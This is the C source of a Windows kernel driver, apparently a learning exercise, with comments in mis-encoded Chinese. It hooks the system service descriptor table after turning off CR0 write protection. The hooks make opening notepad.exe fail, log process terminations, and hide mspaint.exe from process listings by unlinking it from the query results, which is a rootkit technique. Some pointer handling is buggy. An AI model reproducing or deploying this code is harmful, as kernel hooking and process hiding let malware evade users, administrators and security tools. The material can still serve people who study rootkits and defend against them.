#include <ntddk.h>
///////////////////���屾�ؽṹ��//////////////////////////////////////////
struct _SYSTEM_THREADS 
{ 
    LARGE_INTEGER KernelTime; 
    LARGE_INTEGER UserTime; 
    LARGE_INTEGER CreateTime; 
    ULONG WaitTime; 
    PVOID StartAddress; 
    CLIENT_ID ClientIs; 
    KPRIORITY Priority; 
    KPRIORITY BasePriority; 
    ULONG ContextSwitchCount; 
    ULONG ThreadState; 
    KWAIT_REASON WaitReason; 
}; 

typedef struct _SYSTEM_PROCESSES 
{ 
    ULONG NextEntryDelta;
    ULONG ThreadCount; 
    ULONG Reserved[6]; 
    LARGE_INTEGER CreateTime; 
    LARGE_INTEGER UserTime; 
    LARGE_INTEGER KernelTime; 
    UNICODE_STRING ProcessName; 
    KPRIORITY BasePriority; 
    ULONG ProcessId; 
    ULONG InheritedFromProcessId; 
    ULONG HandleCount; 
    ULONG Reserved2[2]; 
    VM_COUNTERS VmCounters; 
    IO_COUNTERS IoCounters; 
    struct _SYSTEM_THREADS Threads[1]; 
}*PSYSTEM_PROCESS, SYSTEM_PROCESS; 


////����SSDT��
typedef struct _ServiceDescriptorEntry {  
    unsigned int *ServiceTableBase;//System Service Dispatch Table �Ļ���ַ��
    unsigned int *ServiceCounterTableBase;//�������ڲ���ϵͳ�� checked builds
    unsigned int NumberOfServices;//�� ServiceTableBase �����ķ������Ŀ
    unsigned char *ParamTableBase;//����ÿ��ϵͳ��������ֽ�����Ļ���ַ��
}ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;

typedef struct _KESSDT
{
    PVOID ServiceTableBase;
    PVOID ServiceCounterTableBase;
    unsigned int NumberOfService;
    PVOID ParamTableBase;    
}ServiceDescriptorEntry, *PServiceDescriptorEntry;
 
//ͨ������id����ȡ���̸�ʽ
NTSTATUS
PsLookupProcessByProcessId(IN HANDLE ProcessId,
						  OUT PEPROCESS *Process);
HANDLE PsGetProcessId( __in PEPROCESS Process );
UCHAR *PsGetProcessImageFileName(PEPROCESS EProcess);

//dll��̬���ӿ⵼��
__declspec (dllimport)ServiceDescriptorEntry KeServiceDescriptorTable;

#define QUERYSYSTEMINFORMATIONID 0xAD
#define SystemProcessAndThreadsInformation 5

//��MyNtOpenProcess����������
typedef NTSTATUS(*MYNTOPENPROCESS)(
  OUT PHANDLE             ProcessHandle,
  IN ACCESS_MASK          AccessMask,
  IN POBJECT_ATTRIBUTES   ObjectAttributes,
  IN PCLIENT_ID           ClientId );//����һ��ָ�뺯�������������Old_NtOpenProcess����ǿ��ת��
ULONG Old_NtOpenProcess; //�洢ԭopenprocess������ַ
//��MyNtTerminateProcess����������
typedef NTSTATUS(*MYNTTERMINATEPROCESS)(
	IN HANDLE ProcessHandle,
	IN NTSTATUS ExitStatus);//���ڶ�Old_NtTerminateProcess��ǿ��ת��
ULONG Old_NtTerminateProcess;//�洢ԭterminateprocess������ַ

////��MyNtOpenProcess������ʵ��
NTSTATUS MyNtOpenProcess (
  __out PHANDLE ProcessHandle,
  __in ACCESS_MASK DesiredAccess,
  __in POBJECT_ATTRIBUTES ObjectAttributes,
  __in_opt PCLIENT_ID ClientId
  )
{
    PEPROCESS process; 
	NTSTATUS status;
    char *imageName;  
	
	//�ҵ����ڽ��̵����֣�Ȼ�������Ҫ���ŵ�������ȣ���ֱͬ�ӷ���ʧ��
    status = PsLookupProcessByProcessId(ClientId->UniqueProcess, &process);  
	if(NT_SUCCESS(status)){
		////����174ƫ�ƻ�ȡ��ʽprocess����
		imageName = (char *)((PUCHAR)process + 0x174); 
		////���������ͬ�������ͬ�ͱ����ý���
		if (!strcmp(imageName, "notepad.exe")) {  
			KdPrint(("Protect %s(%d)!\n", imageName,ClientId->UniqueProcess));  
			*ProcessHandle=NULL;
			return STATUS_ACCESS_DENIED;  
		}      
	}
    status = ((MYNTOPENPROCESS)Old_NtOpenProcess)(ProcessHandle,
    DesiredAccess,
    ObjectAttributes,
    ClientId);
	if(NT_SUCCESS(status)){
		KdPrint(("OPEN %s",imageName)); 
	}
	return status;
}  
//Ϊ��ȥ��SSDT���ֻ������
//�ر�ҳ�汣�� 
void PageProOff()
{
  __asm{
	  cli
      mov  eax,cr0
      and  eax,not 10000h
      mov  cr0,eax
    }
}

////��MyNtTerminateProcess������ʵ��
NTSTATUS MyNtTerminateProcess(
    __in_opt HANDLE ProcessHandle,
	__in NTSTATUS ExitStatus)
{
    ULONG uPID;
    NTSTATUS rtStatus;
	NTSTATUS status;
    PCHAR pStrProcName;
    PEPROCESS pEProcess;
    char *strProcName;
	
	//KdPrint(("MyNtTerminateProcess.\n"));  

    //ͨ�����̾������øý�������Ӧ�� FileObject �������������ǽ��̶��󣬻�õ��� EPROCESS ����
    rtStatus = ObReferenceObjectByHandle(ProcessHandle, 
                FILE_READ_DATA, NULL, KernelMode, &pEProcess, NULL);
    if(!NT_SUCCESS(rtStatus))
    {
        return rtStatus;
    }

	//��ý�����
	uPID = (ULONG)PsGetProcessId(pEProcess);
    status = PsLookupProcessByProcessId(uPID,pEProcess);
	strProcName = (char *)((PUCHAR)pEProcess + 0x174);
   
    
	KdPrint(("TERMINATE %s !", strProcName));
    rtStatus = ((MYNTTERMINATEPROCESS)Old_NtTerminateProcess)(ProcessHandle, ExitStatus);
	
  
    return rtStatus;
}


//Ϊ�˽�SSDT���ֻ�����Իظ�������ͻ�����
//��ҳ�汣�� 
void PageProOn()
{
  __asm{
    mov  eax,cr0
    or   eax,10000h
    mov  cr0,eax
    sti
  }
}
//��MyNtQuerySystemInformation����������
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
    IN ULONG SystemInformationClass, 
    IN PVOID SystemInformation, 
    IN ULONG SystemInformationLength, 
    OUT PULONG ReturnLength);

// ����һ���ɵ�ZwQuerySystemInformation�ľ�ַ���Իظ�
ZWQUERYSYSTEMINFORMATION OldQuerySystemInformation;

//MyZwQuerySystemInformation����ʵ��
NTSTATUS MyZwQuerySystemInformation(IN ULONG SystemInformationClass, IN OUT PVOID SystemInformation, 
                                    IN ULONG SystemInformationLength, OUT PULONG ReturnLength)
{
    PSYSTEM_PROCESS systemprocess;
    PSYSTEM_PROCESS prev;
    NTSTATUS status;
    UNICODE_STRING uprocessname;

    if (NULL == OldQuerySystemInformation)
    {
        return STATUS_UNSUCCESSFUL;
    }

    status = OldQuerySystemInformation(SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);


    if (!NT_SUCCESS(status))
    {
        return status;
    }

    if (SystemProcessAndThreadsInformation != SystemInformationClass)
    {
        return status;
    }

    RtlInitUnicodeString(&uprocessname, L"mspaint.exe");
    systemprocess = (PSYSTEM_PROCESS)SystemInformation;
    prev = systemprocess;

    while(systemprocess->NextEntryDelta)
    {
        if (RtlEqualUnicodeString(&systemprocess->ProcessName, &uprocessname, TRUE))
        {
            //prev->NextEntryDelta = systemprocess + systemprocess->NextEntryDelta;
            prev->NextEntryDelta = prev->NextEntryDelta + systemprocess->NextEntryDelta;
            DbgPrint("Hide mspaint.exe\n");
            break;
        }

        prev = systemprocess;
        systemprocess = (PSYSTEM_PROCESS)((char*)systemprocess + systemprocess->NextEntryDelta);
    }

    return status;
}
//ȥ��OpenProcess�����Ĺ���
void UnHookOpen()
{
	ULONG OpenAddress;
	ULONG OpenServiceNumber;
	OpenServiceNumber = *(PULONG)((PUCHAR)ZwOpenProcess+1);
    OpenAddress = (ULONG)KeServiceDescriptorTable.ServiceTableBase + OpenServiceNumber*4; 
	
    PageProOff();
	//�ָ�ԭ����ַ
    *(ULONG*)OpenAddress = (ULONG)Old_NtOpenProcess;
    PageProOn();
}
//ȥ��TerminateProcess�����Ĺ���
void UnHookTerminate()
{
	ULONG TerAddress;
	ULONG TerServiceNumber;
		
	TerServiceNumber = *(PULONG)((PUCHAR)ZwTerminateProcess+1);
    TerAddress = (ULONG)KeServiceDescriptorTable.ServiceTableBase + TerServiceNumber*4;

    PageProOff();
	//�ָ�ԭ����ַ
	*(ULONG*)TerAddress = (ULONG)Old_NtTerminateProcess;
    PageProOn();
}

//�������
NTSTATUS Unload(PDRIVER_OBJECT DriverObject)
{
    ULONG address = (ULONG)((char*)KeServiceDescriptorTable.ServiceTableBase + QUERYSYSTEMINFORMATIONID * 4);
    PageProOff();

    *((ULONG*)address) = (ULONG)OldQuerySystemInformation;

    PageProOn();

	UnHookOpen();
	UnHookTerminate();
	KdPrint(("Driver Unload Success !"));
    
    return STATUS_SUCCESS;
}

//����Open����
NTSTATUS ssdt_OpenHook()
{
	//���ԭ��openprocess�ĵ�ַ�������Լ��ĵ�ַ
	//����ԭ��ַ
	ULONG OpenAddress;

	ULONG OpenServiceNumber;

	OpenServiceNumber = *(PULONG)((PUCHAR)ZwOpenProcess+1);
    OpenAddress = (ULONG)KeServiceDescriptorTable.ServiceTableBase + OpenServiceNumber*4; 
		
    PageProOff();
  //��ԭ��ssdt����Ҫhook�ĺ�����ַ���������Լ��ĺ�����ַ
    Old_NtOpenProcess = *(ULONG*)OpenAddress ;
	*(ULONG*)OpenAddress = (ULONG)MyNtOpenProcess;

    PageProOn();
    return STATUS_SUCCESS;
}

//����Terminate��������
NTSTATUS ssdt_TerminateHook()
{
	//���ԭ��terminateprocess�ĵ�ַ�������Լ��ĵ�ַ
	//����ԭ��ַ
	ULONG TerAddress;

	ULONG TerServiceNumber;

	TerServiceNumber = *(PULONG)((PUCHAR)ZwTerminateProcess+1);
    TerAddress = (ULONG)KeServiceDescriptorTable.ServiceTableBase + TerServiceNumber*4;

    PageProOff();
    //��ԭ��ssdt����Ҫhook�ĺ�����ַ���������Լ��ĺ�����ַ
	Old_NtTerminateProcess = *(ULONG*)TerAddress;
	*(ULONG*)TerAddress = (ULONG)MyNtTerminateProcess;
    PageProOn();
    return STATUS_SUCCESS;
}

//����Query��������
NTSTATUS ssdt_QueryHook()
{
	//���ԭ��terminateprocess�ĵ�ַ�������Լ��ĵ�ַ
	//����ԭ��ַ
	ULONG QueryAddress;
    QueryAddress = (ULONG)((char*)KeServiceDescriptorTable.ServiceTableBase + QUERYSYSTEMINFORMATIONID * 4);

    PageProOff();
    //��ԭ��ssdt����Ҫhook�ĺ�����ַ���������Լ��ĺ�����ַ
	OldQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)*((ULONG*)QueryAddress);
	 *((ULONG*)QueryAddress) = (ULONG*)MyZwQuerySystemInformation;
    PageProOn();
    return STATUS_SUCCESS;
}

//�����������
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    //ULONG address = (ULONG)((char*)KeServiceDescriptorTable.ServiceTableBase + QUERYSYSTEMINFORMATIONID * 4);
    //OldQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)*((ULONG*)address);

	DbgPrint("My Own Hook Driver!");
	ssdt_QueryHook();
	ssdt_OpenHook();
	ssdt_TerminateHook();
    DriverObject->DriverUnload = Unload;
    return STATUS_SUCCESS;
}